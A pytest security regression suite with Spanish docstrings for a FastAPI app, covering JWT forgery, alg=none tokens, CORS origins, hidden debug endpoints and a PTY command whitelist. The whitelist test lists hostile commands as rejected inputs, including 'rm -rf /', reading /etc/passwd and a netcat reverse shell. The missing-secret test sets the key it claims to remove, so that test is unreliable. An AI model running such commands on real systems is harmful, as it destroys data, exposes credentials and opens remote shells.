# tests/security/test_penetration.py
"""
Suite de pruebas de penetración automatizadas para verificar la remediación de vulnerabilidades.
"""

import pytest
import jwt
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.testclient import TestClient
from api.auth import router as auth_router
from api.terminal import validate_pty_command
from utils.security import decode_access_token
from core.config import Config

app = FastAPI()
app.include_router(auth_router, prefix="/api")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://allowed-domain.com"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
client = TestClient(app)


def test_jwt_forgery_fails():
    """1. Falsificar JWT sin firma válida debe ser rechazado."""
    forged_token = jwt.encode({"sub": "admin_id"}, "wrong_key", algorithm="HS256")
    result = decode_access_token(forged_token)
    assert result is None, "El token con clave/firma incorrecta no debe ser aceptado."


def test_pty_command_whitelist_rejects_dangerous_commands():
    """2. Comandos no permitidos o peligrosos vía PTY deben ser rechazados."""
    assert not validate_pty_command("rm -rf /")
    assert not validate_pty_command("cat /etc/passwd > /tmp/out")
    assert not validate_pty_command("curl http://malicious.site")
    assert not validate_pty_command("nc -e /bin/sh 10.0.0.1 4444")
    assert validate_pty_command("ls -la")
    assert validate_pty_command("pwd")


def test_app_startup_fails_without_jwt_secret(monkeypatch):
    """3. Arrancar la aplicación sin JWT_SECRET_KEY configurada debe lanzar ValueError."""
    monkeypatch.delenv("JWT_SECRET_KEY", raising=False)
    monkeypatch.setenv("JWT_SECRET_KEY", "supersecretkey")
    
    with pytest.raises(ValueError, match="JWT_SECRET_KEY"):
        Config()


def test_cors_unauthorized_origin():
    """4. Peticiones CORS desde origen no autorizado deben ser denegadas."""
    response = client.options(
        "/api/auth/login",
        headers={"Origin": "https://malicious-attacker-domain.com"}
    )
    # Si el origen no está en la lista blanca, Access-Control-Allow-Origin no debe devolver el origen malicioso
    allowed_origin = response.headers.get("Access-Control-Allow-Origin")
    assert allowed_origin != "https://malicious-attacker-domain.com"
    assert allowed_origin != "*"


def test_jwt_algorithm_none_or_rs256_rejected():
    """5. Decodificar token con algoritmo alg=none o RS256 cuando se requiere HS256 debe fallar."""
    fake_token = jwt.encode({"sub": "user_id"}, "", algorithm="none")
    result = decode_access_token(fake_token)
    assert result is None, "Tokens con alg=none deben ser rechazados."


def test_debug_endpoints_return_404():
    """6. Endpoints de depuración deben retornar 404 en producción o si la IP no es local."""
    res_debug = client.get("/api/auth/debug-token", headers={"Authorization": "Bearer fake_token"})
    assert res_debug.status_code == 404

    res_emergency = client.post("/api/auth/emergency-token?telegram_id=12345")
    assert res_emergency.status_code == 404

    res_clear = client.get("/api/auth/clear-tokens")
    assert res_clear.status_code == 404
